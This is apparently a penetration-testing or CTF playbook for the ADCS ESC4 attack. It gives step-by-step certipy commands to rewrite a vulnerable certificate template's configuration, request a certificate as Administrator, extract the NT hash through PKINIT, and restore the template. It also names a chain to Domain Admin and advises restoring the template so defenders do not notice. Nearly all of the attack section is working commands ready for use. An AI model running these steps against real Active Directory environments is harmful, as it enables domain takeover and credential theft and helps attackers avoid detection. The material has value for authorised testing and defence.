# ADCS ESC4 — Vulnerable Template DACL

## When this applies

- ADCS environment where the certificate template DACL grants `WriteProperty`/`WriteDacl`/`GenericWrite` to a non-admin principal (often a group like `Cert Publishers`, or any account chained from an ACL takeover).
- Goal: flip the template into an ESC1 (Enrollee-Supplies-Subject + Client-Auth EKU), enrol as any UPN, then restore.

## Technique

Modify the template DACL/properties to make it ESC1-equivalent, request a cert as Administrator, then restore template config to leave the environment clean.

## Steps

```bash
# Discover: certipy find -u user@dom -p pass -dc-ip DC -vulnerable -stdout  → "ESC4"
# 1. Save current template config so you can restore it (CRITICAL — leaves environment clean)
certipy template -u user@dom -p pass -dc-ip DC -template TEMPLATE_NAME -save-old
# 2. Flip the DACL: template now ESC1-equivalent (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT, Client Auth EKU,
#    no manager approval, broadly enrollable). Default certipy template -write does this.
certipy template -u user@dom -p pass -dc-ip DC -template TEMPLATE_NAME -write-default-configuration
# 3. Issue a cert as any UPN (target Administrator) — pass -target IP and -dns-tcp -ns DC_IP
#    if certipy hangs on FQDN resolution over VPN.
certipy req -u user@dom -p pass -ca CA_NAME -template TEMPLATE_NAME \
  -upn administrator@dom -target DC_IP -dns-tcp -ns DC_IP -out admin
# 4. PKINIT → NT hash
certipy auth -pfx admin.pfx -dc-ip DC_IP
# 5. RESTORE the template (always — leaving an open ESC1 alive trips defender + breaks rerun)
certipy template -u user@dom -p pass -dc-ip DC -template TEMPLATE_NAME -configuration TEMPLATE_NAME.json
```

## Verifying success

- `certipy auth` prints the NT hash for the impersonated UPN.
- Template restore step returns no errors and `certipy template -template ... -save-old` confirms the original config matches.

## Common pitfalls

- Common chain: WriteOwner-on-CA-svc → set owner self → genericAll → shadow creds for ca_svc → ca_svc is in `Cert Publishers` (FullControl on templates) → ESC4 → DA. Treat `Cert Publishers` membership as Tier 0 even on "Easy" boxes.
- `certipy req` over a VPN with no internal DNS frequently hangs on hostname lookup; always prefer `-target <IP> -dns-tcp -ns <DC_IP>` to keep DNS in-band.
- Forgetting step 5 (restore) leaves the template open — visible to defenders + may break test reruns.

## Tools

- certipy (`template`, `req`, `auth`)
